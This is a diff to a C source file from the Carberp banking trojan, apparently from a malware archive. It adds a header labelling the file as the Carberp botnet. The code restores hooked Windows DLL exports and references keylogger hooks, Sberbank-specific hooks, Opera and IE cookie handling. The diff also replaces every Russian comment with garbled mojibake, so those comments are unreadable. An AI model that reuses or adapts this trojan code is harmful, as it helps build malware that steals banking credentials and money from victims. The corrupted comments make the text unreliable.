@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -10,7 +21,7 @@
 
 PIMAGE_NT_HEADERS Unhook_GetNTHeaders(LPVOID Image)
 {
-	// Получаем заголовок образа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!Image)
 		return NULL;
 	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Image;
@@ -27,7 +38,7 @@ PIMAGE_NT_HEADERS Unhook_GetNTHeaders(LPVOID Image)
 
 bool CanRestoreFunc(const char* Name, PDWORD ProcNameHashes)
 {
-	// Функция проверет необходимость восстановления нужной функции
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Hash = STRA::Hash(Name);
 	while (*ProcNameHashes)
 	{
@@ -43,19 +54,19 @@ bool CanRestoreFunc(const char* Name, PDWORD ProcNameHashes)
 void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNameHashes)
 {
 	const static DWORD RestoreSize = 10;
-	// Получаем заголовок dll
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll
 	PIMAGE_NT_HEADERS OriginalHeaders = Unhook_GetNTHeaders(OriginalImage);
 	PIMAGE_NT_HEADERS CurrentHeaders  = Unhook_GetNTHeaders(CurrentImage);
 
-	// Получаем директорию  информацией о таблице экспорта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PIMAGE_DATA_DIRECTORY OriginalDirectory = &OriginalHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 	PIMAGE_DATA_DIRECTORY CurrentDirectory = &CurrentHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
-	// Получаем таблицу экпорта
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PIMAGE_EXPORT_DIRECTORY OriginalExports = (PIMAGE_EXPORT_DIRECTORY)(OriginalImage + OriginalDirectory->VirtualAddress);
 	PIMAGE_EXPORT_DIRECTORY CurrentExports  = (PIMAGE_EXPORT_DIRECTORY)(CurrentImage + CurrentDirectory->VirtualAddress);
 
-    // Перебираем все функции и определяем необходимоть вотановления
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PDWORD NameRef = (PDWORD)(OriginalImage + OriginalExports->AddressOfNames);
 	PWORD  Ordinal = (PWORD)(OriginalImage + OriginalExports->AddressOfNameOrdinals);
 	PWORD  Ordinal2 = (PWORD)(CurrentImage + CurrentExports->AddressOfNameOrdinals);
@@ -64,14 +75,14 @@ void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNam
 	{
 		PCHAR Name = (PCHAR)(OriginalImage + *NameRef);
 		if (!CanRestoreFunc(Name, ProcNameHashes)) continue;
-		// Получаем указатели на функции в обоих dll
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ dll
         WORD idx = *Ordinal;
 		LPBYTE OriginalFunc = (OriginalImage + *(PDWORD)(OriginalImage + OriginalExports->AddressOfFunctions + (idx*4)));
 		LPBYTE CurrentFunc = (CurrentImage + *(PDWORD)(CurrentImage + CurrentExports->AddressOfFunctions + (idx*4)));
 
 		if (m_memcmp(OriginalFunc, CurrentFunc, RestoreSize) != 0)
 		{
-			// Функции отличаются, востанавливаем код.
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
 			DWORD OldProtect = 0;
 			if ((BOOL)pVirtualProtect((LPVOID)CurrentFunc, RestoreSize, PAGE_EXECUTE_READWRITE, &OldProtect ) )
 			{
@@ -85,9 +96,9 @@ void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNam
 
 void WINAPI UnhookFunc(LPVOID OriginalImage, const char *Dll, PDWORD NameHashes)
 {
-	// Функция снимает хуки с указанного массива хэщей функций
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Получаем текущий образ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	LPVOID CurrentImage = (LPVOID)GetDllBase(STRA::Hash(Dll));
 
 	PIMAGE_NT_HEADERS Headers = Unhook_GetNTHeaders(OriginalImage);
@@ -95,37 +106,37 @@ void WINAPI UnhookFunc(LPVOID OriginalImage, const char *Dll, PDWORD NameHashes)
 	if (!Headers || !CurrentImage || !NameHashes)
 		return;
 
-	// Загружаем dlld промежуточный буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dlld пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	LPVOID OriginalDLL = MemAlloc(Headers->OptionalHeader.SizeOfImage);
 
 
 	if (OriginalDLL)
 	{
 		//***************************************************
-		//  Для корректного снятия хуков нам необходимо
-		//  привести образ оригинальной dll. с этой целью
-		//  мы загружаем ораз в память, копируем екции и
-		//  правим релоки
-		//  Релоки правим таким образом чтобы получились
-		//  адреса как в целевой библиотеке
+		//  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll. пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+		//  пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ
+		//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		//***************************************************
 
-		// Копируем заголовки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD CopySize = ((PIMAGE_DOS_HEADER)OriginalImage)->e_lfanew + Headers->OptionalHeader.SizeOfHeaders;
 		m_memcpy(OriginalDLL, OriginalImage, CopySize);
 
 		PIMAGE_NT_HEADERS NewHeaders = Unhook_GetNTHeaders(OriginalDLL);
 		NewHeaders->OptionalHeader.ImageBase = (DWORD)OriginalDLL;
 
-		// Копируем секции
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		CopySections((LPBYTE)OriginalImage, (LPBYTE)OriginalDLL, Headers, NewHeaders);
 
-		// Обрабатываем релоки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Delta = (DWORD)CurrentImage - Headers->OptionalHeader.ImageBase;
 		ProcessRelocation((LPBYTE)OriginalDLL, NewHeaders, Delta);
 
 
-		// Приводим оригинальный образ к настройкам загруженного образа
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		UnhookFunc((LPBYTE)OriginalDLL,  (LPBYTE)CurrentImage, NameHashes);
 
         MemFree(OriginalDLL);
@@ -135,7 +146,7 @@ void WINAPI UnhookFunc(LPVOID OriginalImage, const char *Dll, PDWORD NameHashes)
 //---------------------------------------------------------------------------
 
 
-// Копируем dll во временный файл
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 char* CopyDllToTemp( const char* nameDll, char* nameTemp )
 {
 	HMODULE module = (HMODULE)pGetModuleHandleA(nameDll);
@@ -197,7 +208,7 @@ void WINAPI RestoreFuncs(TDllId Dll, DWORD *dwFuncMass)
 
 
 /************************************************************************/
-//* Восстанавливает неэкспорируемую функцию по её VA                    */
+//* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ VA                    */
 void WINAPI UnhookFunc2( LPVOID hMap, const char *Dll, DWORD dwProcVA )
 {
 	BYTE entryPointBytes[10];
@@ -233,7 +244,7 @@ void WINAPI UnhookFunc2( LPVOID hMap, const char *Dll, DWORD dwProcVA )
 
 
 /************************************************************************/
-/* Восстанавливает вектор неэкспортируемых функций по их VA             */
+/* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ VA             */
 void WINAPI RestoreFuncs2( const char *Dll, DWORD *dwFuncMass)
 {
 	char TempDll[MAX_PATH];
@@ -421,7 +432,7 @@ void WINAPI RestoreFuncs2( const char *Dll, DWORD *dwFuncMass)
 #define C_GetClipboardData				0x8E7AE818
 
 
-//кейлогеровские хуки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 #define C_PEEKMESSAGEA			0xD7A87C2C
 #define C_GETMESSAGEA			0xC8A274AC
 #define C_PEEKMESSAGEW			0xD7A87C3A
@@ -592,7 +603,7 @@ void UnhookUser32()
 	RestoreFuncs(DLL_USER32, dwUser32);
 }
 
-/// Функции добавленные при добавлении RuBnk
+/// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ RuBnk
 //#ifdef RuBnkH
 void UnhookTranslateMessage()
 {
@@ -628,7 +639,7 @@ void UnhookShowWindow()
 }
 
 //#endif
-//удаление кукисов в ие
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ
 void UnhookCookie()
 {
 	DWORD dwUser32[] ={ C_DIALOGBOX_PARAMW, 0 };
@@ -642,8 +653,8 @@ void UnhookOpera(DWORD dwAddr)
 {
 	DWORD dwOpera[] ={ dwAddr, 0 };
 
-	// Opera.dll слинкована динамически, чтобы всё работало
-	// нужно подгрузить её в процесс раньше, чем браузер
+	// Opera.dll пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pLoadLibraryW(GetDLLName(DLL_OPERA));
 
 	RestoreFuncs2(GetDLLName(DLL_OPERA), dwOpera);
@@ -664,14 +675,14 @@ void UnhookGetMessagePos()
  RestoreFuncs( DLL_USER32, dwUser32);
 }
 /************************************************************************/
-//кейлогеровские хуки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 void UnhookKeyLogger()
 {
 	DWORD dwUser32[] ={ C_PEEKMESSAGEA, C_GETMESSAGEA, C_PEEKMESSAGEW, C_GETMESSAGEW, 0 };
 	RestoreFuncs( DLL_USER32,  dwUser32);
 }
 /************************************************************************/
-//хуки для Sber
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Sber
 void UnhookSber()
 {
 	DWORD dwUser32[] ={ C_SHOWWINDOW, C_TRANSLATEMESSAGE,
